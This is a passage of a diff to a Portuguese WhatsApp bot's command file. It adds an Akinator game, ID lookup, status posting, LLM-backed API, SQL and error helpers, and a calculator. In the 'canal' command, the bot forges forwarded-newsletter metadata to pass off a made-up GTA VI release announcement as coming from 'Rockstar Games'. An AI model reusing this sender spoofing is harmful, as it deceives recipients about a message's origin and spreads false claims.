+quoted:selo
+});
+
+
+await conn.relayMessage(
+from,
+msg.message,
+{
+messageId:msg.key.id
+});
+
+};
+
+
+
+const enviarPalpite = async (estado)=>{
+
+let p = estado.palpite;
+
+
+let texto = `
+╭━━〔 🧞 AKINATOR 〕━━⬣
+
+🎯 Acho que é:
+
+👤 ${p.nome}
+
+${p.descricao || ''}
+
+Acertei?
+╰━━━━━━━━━━━━━━⬣`;
+
+
+let buttons=[
+{
+name:"quick_reply",
+buttonParamsJson:JSON.stringify({
+display_text:"✅ Acertou",
+id:`${prefix}aki acertou`
+})
+},
+{
+name:"quick_reply",
+buttonParamsJson:JSON.stringify({
+display_text:"❌ Errou",
+id:`${prefix}aki errou`
+})
+}
+];
+
+
+let media;
+
+try{
+
+media = await prepareWAMessageMedia(
+{image:{url:getReacaoAki()}},
+{upload:conn.waUploadToServer}
+);
+
+}catch{}
+
+
+const msg = generateWAMessageFromContent(from,{
+interactiveMessage:{
+body:{text:texto},
+footer:{text:"🧞 Akinator"},
+header:{
+hasMediaAttachment:true,
+imageMessage:media?.imageMessage
+},
+nativeFlowMessage:{
+buttons
+}
+}
+},{
+userJid:conn.user.id,
+quoted:selo
+});
+
+
+await conn.relayMessage(
+from,
+msg.message,
+{
+messageId:msg.key.id
+});
+
+};
+
+
+
+let sub=(q||'').toLowerCase().trim();
+
+
+let mapa={
+'s':'s',
+'sim':'s',
+
+'n':'n',
+'nao':'n',
+'não':'n',
+
+'nsei':'nsei',
+'naosei':'nsei',
+
+'psim':'t',
+'provavelsim':'t',
+
+'pnao':'t',
+'provavelnao':'t'
+};
+
+
+if(!sub || sub=='start'){
+
+await reagir(from,"🧞");
+
+let data=await call('start');
+
+return enviarPergunta(data);
+
+}
+
+
+if(sub=='voltar'){
+
+let data=await call('back');
+
+return data.adivinhou ? enviarPalpite(data) : enviarPergunta(data);
+
+}
+
+
+if(sub=='parar'){
+
+await call('stop');
+
+return reply("🧞 Partida encerrada.");
+
+}
+
+
+if(sub=='acertou'){
+
+let data=await call('choice');
+
+return reply(`🎉 Acertei! Era ${data.confirmado?.nome || 'ele'}`);
+
+}
+
+
+if(sub=='errou'){
+
+let data=await call('exclude');
+
+return data.adivinhou ? enviarPalpite(data) : enviarPergunta(data);
+
+}
+
+
+if(mapa[sub]){
+
+let data=await call('answer',{
+r:mapa[sub]
+});
+
+return data.adivinhou ? enviarPalpite(data) : enviarPergunta(data);
+
+}
+
+
+return reply(`
+🧞 *Akinator*
+
+Use:
+${prefix}aki
+
+Respostas:
+s
+n
+nsei
+p
+pn
+
+Outros:
+voltar
+parar
+`);
+
+
+}catch(e){
+
+console.log('[AKINATOR ERROR]',e);
+
+reply("❌ Está partida não está iniciada, ou você não é participante dela.");
+
+}
+
+}
+break;
+
+case 'lid':
+case 'id':
+case 'meuid': {
+  try {
+
+    const jid = m?.key?.participant || m?.key?.remoteJid || m?.sender || ''
+
+    const isWhatsAppUser = jid.includes('@s.whatsapp.net')
+
+    const number = isWhatsAppUser
+      ? '+' + jid.split('@')[0]
+      : '❌ não é número WhatsApp válido'
+
+    const text = `
+🆔 *SEU ID (LID)*
+
+👤 Nome: ${m.pushName || 'Desconhecido'} 
+🔖 JID: ${jid}
+`
+
+    await conn.relayMessage(from, {
+      interactiveMessage: {
+        body: { text },
+        footer: { text: "Zyron-MD ❤️‍🔥" },
+        nativeFlowMessage: {
+          buttons: [
+            {
+              name: "cta_copy",
+              buttonParamsJson: JSON.stringify({
+                display_text: "📋 Copiar ID",
+                copy_code: jid
+              })
+            }
+          ]
+        }
+      }
+    }, {})
+
+  } catch (e) {
+    console.log(e)
+    reply("❌ Erro ao pegar ID")
+  }
+}
+break;
+
+case 'canal': {
+    try {
+        const canalJid = '120363306546079744@newsletter';
+
+        await conn.sendMessage(from, {
+            react: {
+                text: "🧪",
+                key: info.key
+            }
+        });
+
+        await conn.sendMessage(from, {
+            text: `⚠️ *NOTICE* ⚠️\n\n Grand Theft Auto VI will be released tomorrow, July 5th, 2026.`,
+            contextInfo: {
+                forwardingScore: 127,
+                isForwarded: true,
+                forwardedNewsletterMessageInfo: {
+                    newsletterJid: canalJid,
+                    serverMessageId: 1,
+                    newsletterName: "Rockstar Games"
+                }
+            }
+        });
+
+    } catch (e) {
+        console.log(e);
+        reply(`❌ Erro ao enviar mensagem com canal:\n\n${e.message}`);
+    }
+}
+break;
+
+case 'statusvip': {
+try {
+const jid = from
+const { randomBytes } = require('crypto')
+const messageSecret = randomBytes(32)
+
+const quoted = m?.quoted ||
+m?.message?.extendedTextMessage?.contextInfo?.quotedMessage ||
+null
+
+const mime =
+quoted?.imageMessage?.mimetype ||
+quoted?.videoMessage?.mimetype ||
+quoted?.audioMessage?.mimetype ||
+''
+
+const text = q?.trim() || ''
+
+const closeFriends = {
+contextInfo: {
+isGroupStatus: true,
+statusAudienceMetadata: {
+audienceType: 1
+}
+}
+}
+
+async function sendExtras() {
+try {
+await conn.sendMessage(jid, {
+text: '🛍️ Siga @gzeescripts no TikTok.'
+}, { quoted: m })
+} catch {}
+
+try {
+await conn.relayMessage(jid, {
+interactiveMessage: {
+body: {
+text: '💳 Pagamento Zyron-MD Productions ©'
+},
+nativeFlowMessage: {
+buttons: [{
+name: 'inapp_signup',
+buttonParamsJson: '{}'
+}],
+messageParamsJson: '{}'
+}
+}
+}, {})
+} catch {}
+}
+
+// TEXTO
+if (!mime) {
+
+if (!text)
+return reply(`📌 Use:\n• ${prefix}statusvip seu texto\n• ou responda uma imagem, vídeo ou áudio.`)
+
+const msgStatus = generateWAMessageFromContent(jid, {
+messageContextInfo: { messageSecret },
+groupStatusMessageV2: {
+message: {
+extendedTextMessage: {
+text,
+contextInfo: closeFriends.contextInfo
+},
+messageContextInfo: { messageSecret }
+}
+}
+}, {})
+
+await conn.relayMessage(jid, msgStatus.message, {
+messageId: msgStatus.key.id
+})
+
+setTimeout(sendExtras, 1500)
+break
+}
+
+// BAIXA MÍDIA
+const buffer = await downloadMediaMessage(
+{ message: quoted },
+'buffer',
+{},
+{
+logger: undefined,
+reuploadRequest: conn.updateMediaMessage
+}
+)
+
+if (!buffer) return reply('❌ Não consegui baixar essa mídia.')
+
+// IMAGEM
+if (/image/.test(mime)) {
+
+const prep = await prepareWAMessageMedia(
+{ image: buffer },
+{ upload: conn.waUploadToServer }
+)
+
+const msgStatus = generateWAMessageFromContent(jid, {
+messageContextInfo: { messageSecret },
+groupStatusMessageV2: {
+message: {
+imageMessage: {
+...prep.imageMessage,
+caption: text,
+contextInfo: closeFriends.contextInfo
+},
+messageContextInfo: { messageSecret }
+}
+}
+}, {})
+
+await conn.relayMessage(jid, msgStatus.message, {
+messageId: msgStatus.key.id
+})
+
+setTimeout(sendExtras, 1500)
+break
+}
+
+// VÍDEO
+if (/video/.test(mime)) {
+
+const prep = await prepareWAMessageMedia(
+{ video: buffer },
+{ upload: conn.waUploadToServer }
+)
+
+const msgStatus = generateWAMessageFromContent(jid, {
+messageContextInfo: { messageSecret },
+groupStatusMessageV2: {
+message: {
+videoMessage: {
+...prep.videoMessage,
+caption: text,
+contextInfo: closeFriends.contextInfo
+},
+messageContextInfo: { messageSecret }
+}
+}
+}, {})
+
+await conn.relayMessage(jid, msgStatus.message, {
+messageId: msgStatus.key.id
+})
+
+setTimeout(sendExtras, 1500)
+break
+}
+
+// ÁUDIO
+if (/audio/.test(mime)) {
+
+const prep = await prepareWAMessageMedia(
+{
+audio: buffer,
+mimetype: 'audio/mp4'
+},
+{
+upload: conn.waUploadToServer
+}
+)
+
+const msgStatus = generateWAMessageFromContent(jid, {
+messageContextInfo: { messageSecret },
+groupStatusMessageV2: {
+message: {
+audioMessage: {
+...prep.audioMessage,
+contextInfo: closeFriends.contextInfo
+},
+messageContextInfo: { messageSecret }
+}
+}
+}, {})
+
+await conn.relayMessage(jid, msgStatus.message, {
+messageId: msgStatus.key.id
+})
+
+setTimeout(sendExtras, 1500)
+break
+}
+
+reply('❌ Tipo de mídia não suportado.')
+
+} catch (e) {
+console.log('[STATUSVIP ERROR]', e)
+reply(`❌ Erro ao enviar o status.\n\n${e?.message || e}`)
+}
+}
+break;
+
+case 'testf': {
+    if (!So_Dono) return reply('Apenas o dono.');
+
+    try {
+        const { generateWAMessageFromContent } = require('@systemzero/baileys');
+
+        const msg = generateWAMessageFromContent(m.chat, {
+            interactiveMessage: {
+                body: {
+                    text: 'Siga @gzeescripts no TikTok'
+                },
+                nativeFlowMessage: {
+                    buttons: [
+                        {
+                            name: 'quick_reply',
+                            buttonParamsJson: JSON.stringify({
+                                display_text: 'TikTok',
+                                id: 'https://www.tiktok.com/@gzeescripts'
+                            })
+                        }
+                    ],
+                    messageParamsJson: '{}'
+                }
+            }
+        }, { userJid: m.sender });
+
+        await conn.relayMessage(m.chat, msg.message, {
+            messageId: msg.key.id
+        });
+
+    } catch (e) {
+        console.error('[testf]', e);
+        reply('Erro: ' + e.message);
+    }
+
+    break;
+}
+
+case 'divul': {
+    if (!So_Dono) return reply('Apenas o dono.');
+    try {
+        const { data: imgBuffer } = await axios.get('https://files.catbox.moe/lwauqv.png', {
+            responseType: 'arraybuffer'
+        });
+        const image = Buffer.from(imgBuffer);
+
+        const { prepareWAMessageMedia } = require('@systemzero/baileys');
+       //1
+        await conn.sendMessage(m.chat, {
+            paymentInviteServiceType: 3
+        }, { quoted: m });
+      
+        //3
+        await conn.sendMessage(m.chat, {
+            orderText: '🛍️ Siga @gzeescripts no TikTok',
+            thumbnail: image
+        }, { quoted: m });
+
+        try {//4
+            await conn.relayMessage(m.chat, {
+                requestPaymentMessage: {
+                    currencyCodeIso4217: 'BRL',
+                    amount1000: 1000,
+                    requestFrom: m.sender,
+                    noteMessage: {
+                        extendedTextMessage: { text: '💳 Solicitação de pagamento de Zyron-MD Productions ©' }
+                    },
+                    expiryTimestamp: 0,
+                    amount: { value: 1000, offset: 100, currencyCode: 'BRL' }
+                }
+            }, {});
+        } catch (reqErr) {
+            console.log('[TPAY request]', reqErr.message);
+        }
+
+        await conn.sendMessage(m.chat, { text: 'Siga @gzeescripts no TikTok.' });
+    } catch (e) {
+        console.log('[TPAY ERRO]', e);
+        await conn.sendMessage(m.chat, { text: '❌ Erro: ' + e.message });
+    }
+    break; }
+
+case 'apiinfo': {
+try {
+const apiInfo = `╭━━〔 🌐 *INFORMAÇÕES DAS APIs* 〕━━⬣
+
+🚀 *APIs Utilizadas pelo Bot*
+
+🔹 *Lopes API*
+🌍 https://lopes-api.store/
+📌 Diversos endpoints para entretenimento, downloads, IA, ferramentas, imagens e muito mais.
+
+━━━━━━━━━━━━━━━━━━
+
+🔹 *SystemZone API*
+🌍 https://systemzone.store/
+📌 API completa contendo:
+• 🖼️ Geradores Ephoto360
+• 🤖 Inteligência Artificial
+• 🔍 Consultas
+• 🎵 Downloads
+• 📸 Ferramentas de imagem
+• 🛠️ Utilitários
+• 📄 OCR
+• 🔊 TTS (Texto para Voz)
+• 🎤 Separação de Voz
+• 🧹 RemoveBG
+• 📈 Upscaler
+• 📚 E muito mais...
+
+━━━━━━━━━━━━━━━━━━
+
+👨‍💻 *Desenvolvedor do Bot:*
+GzeeScriptsDev</>
+
+💡 *Observação:*
+As APIs são constantemente atualizadas com novos recursos e melhorias.
+
+╰━━━━━━━━━━━━━━━━━━⬣`;
+
+await conn.sendMessage(from, {
+text: apiInfo
+}, { quoted: info });
 
 } catch (e) {
 console.error(e);
-reply('❌ Erro ao ler o QR Code.');
+reply(`❌ Erro ao obter informações das APIs.`);
 }
 }
 break;
 
-case 'cnpj': {
+case 'api':
+case 'apidoc':
+case 'gerarapi': {
 try {
-
-const cnpj = (args[0] || '').replace(/\D/g, '');
-
-if (!cnpj) {
-return reply(`🏢 Use:\n${prefix}cnpj 00000000000191`);
+if (!q?.trim()) {
+return reply(`🌐 *Exemplos:*
+${prefix + command} API de login com JWT
+${prefix + command} API de usuários em Node.js
+${prefix + command} endpoint para buscar CEP
+${prefix + command} API REST de produtos`);
 }
 
-if (cnpj.length !== 14) {
-return reply('❌ CNPJ inválido.');
+await reagir(from, "🌐");
+
+const GROQ_API_KEY = process.env.GROQ_API_KEY || "API_KEY_GROQ";
+
+const pedido = q.trim();
+
+const prompt = `
+Você é especialista em APIs REST, Node.js, Express, Axios, JSON e documentação de endpoints.
+
+Pedido do usuário: "${pedido}"
+
+Retorne SOMENTE JSON válido:
+{
+  "titulo": "",
+  "tipo": "",
+  "descricao": "",
+  "endpoint": "",
+  "metodo": "",
+  "headers": [["Header","Valor"]],
+  "params": [["Parâmetro","Tipo","Descrição"]],
+  "body_json": "",
+  "exemplo_axios": "",
+  "resposta_json": "",
+  "observacoes": ""
 }
 
-const { data } = await axios.get(`https://brasilapi.com.br/api/cnpj/v1/${cnpj}`);
+Regras:
+- Responda em português do Brasil.
+- Não use markdown fora do JSON.
+- endpoint deve parecer uma rota real.
+- body_json deve ser JSON válido em texto.
+- resposta_json deve ser JSON válido em texto.
+- exemplo_axios deve ser código JavaScript usando axios.
+`;
 
-reply(`
-🏢 *CONSULTA DE CNPJ*
+const { data } = await axios.post(
+"https://api.groq.com/openai/v1/chat/completions",
+{
+model: "llama-3.3-70b-versatile",
+messages: [
+{ role: "system", content: "Responda somente JSON válido. Sem markdown." },
+{ role: "user", content: prompt }
+],
+temperature: 0.1
+},
+{
+headers: {
+Authorization: `Bearer ${GROQ_API_KEY}`,
+"Content-Type": "application/json"
+},
+timeout: 30000
+}
+);
 
-📄 Razão Social: ${data.razao_social || 'Não informado'}
-🏷️ Nome Fantasia: ${data.nome_fantasia || 'Não informado'}
+let resposta = data?.choices?.[0]?.message?.content || "";
+resposta = resposta.replace(/```json/gi, "").replace(/```/g, "").trim();
 
-🆔 CNPJ: ${data.cnpj}
-📅 Abertura: ${data.data_inicio_atividade || 'Não informado'}
-📊 Porte: ${data.porte || 'Não informado'}
+const inicio = resposta.indexOf("{");
+const fim = resposta.lastIndexOf("}");
+if (inicio === -1 || fim === -1) throw new Error("JSON não encontrado");
 
-📌 Situação: ${data.descricao_situacao_cadastral || 'Não informado'}
-🏢 Natureza Jurídica: ${data.natureza_juridica || 'Não informado'}
+const json = JSON.parse(resposta.slice(inicio, fim + 1));
 
-📍 Logradouro: ${data.logradouro || 'Não informado'}
-🏠 Número: ${data.numero || 'S/N'}
-🏘️ Bairro: ${data.bairro || 'Não informado'}
-🏙️ Cidade: ${data.municipio || 'Não informado'}
-🌎 UF: ${data.uf || 'Não informado'}
-📮 CEP: ${data.cep || 'Não informado'}
+const headers = Array.isArray(json.headers) ? json.headers : [
+["Header", "Valor"],
+["Content-Type", "application/json"]
+];
 
-☎️ Telefone: ${data.ddd_telefone_1 || 'Não informado'}
-📧 E-mail: ${data.email || 'Não informado'}
+const params = Array.isArray(json.params) ? json.params : [
+["Parâmetro", "Tipo", "Descrição"],
+["-", "-", "Nenhum parâmetro informado"]
+];
 
-🤖 Zyron AI
-`.trim());
+await conn.sendRich(from, [
+
+conn.makeText(
+`# 🌐 API GERADA
+
+🔎 Pedido: *${pedido}*
+📚 Tipo: *${json.tipo || "REST API"}*
+
+## 📌 ${json.titulo || "Endpoint gerado"}
+
+${json.descricao || "Documentação gerada para a API."}
+
+## 🔗 Endpoint
+
+\`${json.metodo || "GET"} ${json.endpoint || "/api/exemplo"}\``
+),
+
+conn.makeTable(headers),
+
+conn.makeTable(params),
+
+conn.makeText(`## 📦 Body JSON`),
+
+conn.makeCode("json", json.body_json || "{}"),
+
+conn.makeText(`## ⚡ Exemplo Axios`),
+
+conn.makeCode("javascript", json.exemplo_axios || `const axios = require("axios");`),
+
+conn.makeText(`## ✅ Resposta esperada`),
+
+conn.makeCode("json", json.resposta_json || "{}"),
+
+conn.makeText(
+`## ⚠️ Observações
+
+${json.observacoes || "Teste o endpoint antes de usar em produção."}`
+)
+
+], info, [
+"RICH_RESPONSE_CODE",
+"RICH_RESPONSE_TABLE"
+]);
+
+await reagir(from, "✅");
 
 } catch (e) {
-console.error(e?.response?.data || e);
-reply('❌ CNPJ não encontrado.');
+console.log("ERRO API:", e?.response?.data || e);
+await reagir(from, "❌");
+reply("❌ Erro ao gerar documentação da API.");
 }
 }
 break;
 
-case 'placa': {
+case 'sql':
+case 'querysql': {
 try {
-
-const placa = (args[0] || '').toUpperCase().replace(/[^A-Z0-9]/g, '');
-
-if (!placa) return reply(`🚗 Use:\n${prefix}placa INT8C36`);
-
-if (!/^[A-Z]{3}[0-9][A-Z0-9][0-9]{2}$/.test(placa)) {
-return reply('❌ Placa inválida.');
+if (!q?.trim()) {
+return reply(`🗄️ *Exemplos:*
+${prefix + command} criar tabela de usuários
+${prefix + command} selecionar todos os admins
+${prefix + command} atualizar saldo do usuário
+${prefix + command} fazer join entre usuarios e grupos`);
 }
 
-const TOKEN = 'SEU_TOKEN_AQUI';
+await reagir(from, "🗄️");
 
-const { data } = await axios.get(`https://apiplacas.com.br/api/consulta/${placa}/${TOKEN}`);
+const GROQ_API_KEY = process.env.GROQ_API_KEY || "API_KEY_GROQ";
 
-const extra = data.extra || {};
-const fipe = data.fipe?.dados?.[0] || {};
+const pedido = q.trim();
 
-reply(`
-🚗 *CONSULTA DE PLACA*
+const prompt = `
+Você é especialista em SQL, MySQL, MariaDB, PostgreSQL e SQLite.
 
-🔖 Placa: ${data.placa || placa}
-🔁 Placa antiga: ${data.placa_alternativa || extra.placa_modelo_antigo || 'Não informado'}
+Pedido do usuário: "${pedido}"
 
-🏷️ Marca: ${data.marca || data.MARCA || 'Não informado'}
-🚘 Modelo: ${data.modelo || data.MODELO || 'Não informado'}
-📌 Submodelo: ${data.SUBMODELO || 'Não informado'}
-📋 Versão: ${data.VERSAO || 'Não informado'}
-🎨 Cor: ${data.cor || 'Não informado'}
+Retorne SOMENTE JSON válido:
+{
+  "titulo": "",
+  "banco": "",
+  "descricao": "",
+  "sql": "",
+  "tabela": [["Comando","Função"]],
+  "observacoes": "",
+  "melhoria": ""
+}
 
-📅 Ano: ${data.ano || extra.ano_fabricacao || 'Não informado'}
-📅 Ano modelo: ${data.anoModelo || extra.ano_modelo || 'Não informado'}
-⛽ Combustível: ${extra.combustivel || fipe.combustivel || 'Não informado'}
-🔩 Cilindradas: ${extra.cilindradas || 'Não informado'}
-👥 Passageiros: ${extra.quantidade_passageiro || 'Não informado'}
+Regras:
+- Responda em português do Brasil.
+- Não use markdown fora do JSON.
+- sql deve conter somente o código SQL.
+- Seja direto e útil.
+`;
 
-🌎 Origem: ${data.origem || extra.nacionalidade || 'Não informado'}
-🏙️ Município: ${data.municipio || extra.municipio || 'Não informado'}
-📍 UF: ${data.uf || extra.uf || 'Não informado'}
+const { data } = await axios.post(
+"https://api.groq.com/openai/v1/chat/completions",
+{
+model: "llama-3.3-70b-versatile",
+messages: [
+{ role: "system", content: "Responda somente JSON válido. Sem markdown." },
+{ role: "user", content: prompt }
+],
+temperature: 0.1
+},
+{
+headers: {
+Authorization: `Bearer ${GROQ_API_KEY}`,
+"Content-Type": "application/json"
+},
+timeout: 30000
+}
+);
 
-🚙 Tipo: ${extra.tipo_veiculo || 'Não informado'}
-🚘 Espécie: ${extra.especie || 'Não informado'}
-📊 Segmento: ${extra.segmento || 'Não informado'}
-📊 Subsegmento: ${extra.sub_segmento || 'Não informado'}
+let resposta = data?.choices?.[0]?.message?.content || "";
+resposta = resposta.replace(/```json/gi, "").replace(/```/g, "").trim();
 
-⚠️ Situação: ${data.situacao || 'Não informado'}
-🔐 Chassi: ${data.chassi || 'Não informado'}
+const inicio = resposta.indexOf("{");
+const fim = resposta.lastIndexOf("}");
+if (inicio === -1 || fim === -1) throw new Error("JSON não encontrado");
 
-💰 *FIPE*
-🏦 Marca FIPE: ${fipe.texto_marca || 'Não informado'}
-🚗 Modelo FIPE: ${fipe.texto_modelo || 'Não informado'}
-💵 Valor: ${fipe.texto_valor || 'Não informado'}
-📆 Referência: ${fipe.mes_referencia || 'Não informado'}
-🆔 Código FIPE: ${fipe.codigo_fipe || 'Não informado'}
+const json = JSON.parse(resposta.slice(inicio, fim + 1));
 
-🕒 Consulta: ${data.data || 'Não informado'}
-✅ Retorno: ${data.mensagemRetorno || 'Não informado'}
+let tabela = Array.isArray(json.tabela) ? json.tabela : [
+["Comando", "Função"],
+["SQL", "Consulta gerada"]
+];
 
-🤖 Zyron AI
-`.trim());
+await conn.sendRich(from, [
+
+conn.makeText(
+`# 🗄️ SQL GERADO
+
+🔎 Pedido: *${pedido}*
+📚 Banco: *${json.banco || "SQL"}*
+
+## 📌 ${json.titulo || "Consulta SQL"}
+
+${json.descricao || "Consulta gerada conforme o pedido."}`
+),
+
+conn.makeCode("sql", json.sql || "-- Nenhum SQL gerado"),
+
+conn.makeTable(tabela),
+
+conn.makeText(
+`## ⚠️ Observações
+
+${json.observacoes || "Teste em um banco de desenvolvimento antes de usar em produção."}
+
+## 🚀 Melhoria
+
+${json.melhoria || "Use índices e filtros para melhorar performance."}`
+)
+
+], info, [
+"RICH_RESPONSE_CODE",
+"RICH_RESPONSE_TABLE"
+]);
+
+await reagir(from, "✅");
 
 } catch (e) {
-console.error(e?.response?.data || e);
-reply('❌ Erro ao consultar placa.');
+console.log("ERRO SQL:", e?.response?.data || e);
+await reagir(from, "❌");
+reply("❌ Erro ao gerar SQL.");
+}
+}
+break;
+
+case 'erro':
+case 'error':
+case 'bug': {
+try {
+if (!q?.trim()) {
+return reply(`🐞 *Exemplo:*\n${prefix + command} SyntaxError: Unexpected token }\n${prefix + command} Cannot find module axios`);
+}
+
+await reagir(from, "🔎");
+
+const GROQ_API_KEY = process.env.GROQ_API_KEY || "API_KEY_GROQ";
+
+const erroUser = q.trim();
+
+const prompt = `
+Você é especialista em Node.js, JavaScript, Termux, Baileys e bots WhatsApp.
+
+Analise este erro:
+"${erroUser}"
+
+Retorne SOMENTE JSON válido:
+{
+  "titulo": "",
+  "tipo": "",
+  "causa": "",
+  "solucao": "",
+  "codigo_corrigido": "",
+  "passos": [["Passo","O que fazer"]],
+  "dica": ""
+}
+
+Regras:
+- Responda em português do Brasil.
+- Não use markdown fora do JSON.
+- Seja direto e prático.
+- codigo_corrigido deve conter um exemplo útil.
+`;
+
+const { data } = await axios.post(
+"https://api.groq.com/openai/v1/chat/completions",
+{
+model: "llama-3.3-70b-versatile",
+messages: [
+{ role: "system", content: "Responda somente JSON válido. Sem markdown." },
+{ role: "user", content: prompt }
+],
+temperature: 0.1
+},
+{
+headers: {
+Authorization: `Bearer ${GROQ_API_KEY}`,
+"Content-Type": "application/json"
+},
+timeout: 30000
+}
+);
+
+let resposta = data?.choices?.[0]?.message?.content || "";
+
+resposta = resposta.replace(/```json/gi, "").replace(/```/g, "").trim();
+
+const inicio = resposta.indexOf("{");
+const fim = resposta.lastIndexOf("}");
+if (inicio === -1 || fim === -1) throw new Error("JSON não encontrado");
+
+const json = JSON.parse(resposta.slice(inicio, fim + 1));
+
+let tabela = Array.isArray(json.passos) ? json.passos : [
+["Passo", "O que fazer"],
+["1", "Verifique o trecho do erro"]
+];
+
+await conn.sendRich(from, [
+
+conn.makeText(
+`# 🐞 ANÁLISE DE ERRO
+
+🔎 Erro enviado:
+\`\`\`text
+${erroUser}
+\`\`\`
+
+## 📌 ${json.titulo || "Erro analisado"}
+
+📂 Tipo: *${json.tipo || "Não identificado"}*
+
+## ⚠️ Causa provável
+
+${json.causa || "Não informada."}
+
+## ✅ Solução
+
+${json.solucao || "Não informada."}`
+),
+
+conn.makeCode("Error", json.codigo_corrigido || "// Sem código corrigido"),
+
+conn.makeTable(tabela),
+
+conn.makeText(
+`## 💡 Dica
+
+${json.dica || "Leia o console completo para achar a linha exata do erro."}`
+)
+
+], info, [
+"RICH_RESPONSE_CODE",
+"RICH_RESPONSE_TABLE"
+]);
+
+await reagir(from, "✅");
+
+} catch (e) {
+console.log("ERRO CASE ERRO:", e?.response?.data || e);
+await reagir(from, "❌");
+reply("❌ Não consegui analisar esse erro.");
+}
+}
+break;
+
+case 'calc':
+case 'calcular':
+case 'matematica': {
+try {
+if (!q?.trim()) {
+return reply(`🧮 *Exemplos:*
+${prefix + command} 2+2*5
+${prefix + command} sqrt(144)
+${prefix + command} 10% de 250
+${prefix + command} derivada x^3 + 2x
+${prefix + command} simplificar 2x + 3x - x
+${prefix + command} resolver x^2 - 5x + 6`);
+}
+
+await reagir(from, "🧮");
+
+const math = require("mathjs");
+
+let entrada = q.trim();
+let resultado = "";
+let tipo = "Cálculo";
+let codigo = "";
+let explicacao = "";
+let curiosidade = "";
+let complexidade = "Fácil";
+
+let tabela = [
+["Item", "Valor"],
+["Entrada", entrada]
+];
+
+function limparConta(txt) {
+return txt
+.replace(/÷/g, "/")
+.replace(/×/g, "*")
+.replace(/,/g, ".")
+.replace(/π/g, "pi")
+.replace(/√\s*\(?([0-9.]+)\)?/gi, "sqrt($1)")
+.replace(/(\d+(?:\.\d+)?)\s*%\s*de\s*(\d+(?:\.\d+)?)/gi, "($1/100)*($2)");
+}
+
+function detectarFuncoes(expr) {
+const lista = [];
+if (/sqrt\(/i.test(expr)) lista.push("Raiz quadrada");
+if (/sin\(/i.test(expr)) lista.push("Seno");
+if (/cos\(/i.test(expr)) lista.push("Cosseno");
+if (/tan\(/i.test(expr)) lista.push("Tangente");
+if (/log10\(/i.test(expr)) lista.push("Logaritmo base 10");
+if (/log\(/i.test(expr)) lista.push("Logaritmo");
+if (/\^/.test(expr)) lista.push("Potência");
+if (/%/.test(entrada) || /\*\/100|\/100/i.test(expr)) lista.push("Porcentagem");
+return lista.length ? lista.join(", ") : "Operações básicas";
+}
+
+function definirComplexidade(expr) {
+let pontos = 0;
+if (expr.length > 20) pontos++;
+if (expr.length > 45) pontos++;
+if (/\^/.test(expr)) pontos++;
+if (/sqrt|sin|cos|tan|log/i.test(expr)) pontos += 2;
+if ((expr.match(/\(/g) || []).length >= 3) pontos++;
+if (/derivada|simplificar|resolver/i.test(entrada)) pontos += 2;
+
+if (pontos <= 1) return "Fácil";
+if (pontos <= 3) return "Média";
+if (pontos <= 5) return "Difícil";
+return "Avançada";
+}
+
+function explicarNumerica(expr, resultado) {
+let partes = [];
+
+if (expr.includes("(")) partes.push("• Primeiro são resolvidos os parênteses.");
+if (/\^/.test(expr)) partes.push("• Depois são calculadas as potências.");
+if (/sqrt\(/i.test(expr)) partes.push("• `sqrt(...)` significa raiz quadrada.");
+if (/sin\(/i.test(expr)) partes.push("• `sin(...)` calcula o seno em radianos.");
+if (/cos\(/i.test(expr)) partes.push("• `cos(...)` calcula o cosseno em radianos.");
+if (/tan\(/i.test(expr)) partes.push("• `tan(...)` calcula a tangente em radianos.");
+if (/log10\(/i.test(expr)) partes.push("• `log10(...)` calcula logaritmo na base 10.");
+if (/%\s*de/i.test(entrada)) partes.push("• A porcentagem foi convertida para multiplicação.");
+
+if (!partes.length) {
+partes.push("• A conta foi resolvida seguindo a ordem normal da matemática.");
+}
+
+return partes.join("\n") + `\n\n✅ Resultado final: *${resultado}*`;
+}
+
+function explicarNotacao(resultado) {
+if (!String(resultado).includes("e+")) return "";
+
+const [base, exp] = String(resultado).split("e+");
+const aproximado = Number(resultado).toLocaleString("pt-BR", {
+maximumFractionDigits: 10
+});
+
+return `## 🔬 Notação científica
+
+O resultado apareceu com \`e+\`.
+
+Isso significa:
+
+\`\`\`text
+${resultado} = ${base} × 10^${exp}
+\`\`\`
+
+Aproximadamente:
+
+\`\`\`text
+${aproximado}
+\`\`\``;
+}
+
+let expr = limparConta(entrada);
+complexidade = definirComplexidade(expr);
+
+if (/^derivada\s+/i.test(expr)) {
+tipo = "Derivada";
+expr = expr.replace(/^derivada\s+/i, "").trim();
+
+const derivada = math.derivative(expr, "x").toString();
+
+resultado = derivada;
+codigo = `f(x) = ${expr}\nf'(x) = ${derivada}`;
+
+explicacao = `A derivada mostra como uma função muda em relação a uma variável.
+
+Neste caso, a variável usada foi *x*.
+
+Resultado:
+${derivada}`;
+
+curiosidade = "Derivadas são muito usadas em física, engenharia, economia e inteligência artificial.";
+
+tabela.push(["Tipo", "Derivada"]);
+tabela.push(["Variável", "x"]);
+tabela.push(["Funções usadas", "derivative"]);
+tabela.push(["Complexidade", complexidade]);
+tabela.push(["Resultado", derivada]);
+
+} else if (/^simplificar\s+/i.test(expr)) {
+tipo = "Simplificação";
+expr = expr.replace(/^simplificar\s+/i, "").trim();
+
+const simp = math.simplify(expr).toString();
+
+resultado = simp;
+codigo = `${expr} = ${simp}`;
+
+explicacao = `A simplificação reduz a expressão juntando termos semelhantes.
+
+Expressão original:
+${expr}
+
+Forma simplificada:
+${simp}`;
+
+curiosidade = "Simplificar expressões ajuda a deixar contas maiores mais fáceis de resolver.";
+
+tabela.push(["Tipo", "Simplificação"]);
+tabela.push(["Funções usadas", "simplify"]);
+tabela.push(["Complexidade", complexidade]);
+tabela.push(["Resultado", simp]);
+
+} else if (/^resolver\s+/i.test(expr)) {
+tipo = "Equação";
+expr = expr.replace(/^resolver\s+/i, "").trim();
+
+let eq = expr.includes("=") ? expr : `${expr}=0`;
+let [ladoA, ladoB] = eq.split("=").map(x => x.trim());
+
+let polinomio = math.simplify(`(${ladoA}) - (${ladoB})`).toString();
+
+let roots = [];
+
+try {
+const node = math.parse(polinomio);
+const compiled = node.compile();
+
+for (let i = -100; i <= 100; i++) {
+let a = i;
+let b = i + 1;
+let fa = compiled.evaluate({ x: a });
+let fb = compiled.evaluate({ x: b });
+
+if (fa === 0) roots.push(a);
+
+if (fa * fb < 0) {
+let low = a;
+let high = b;
+
+for (let j = 0; j < 60; j++) {
+let mid = (low + high) / 2;
+let fm = compiled.evaluate({ x: mid });
+
+if (Math.abs(fm) < 1e-10) {
+low = high = mid;
+break;
+}
+
+if (fa * fm < 0) {
+high = mid;
+} else {
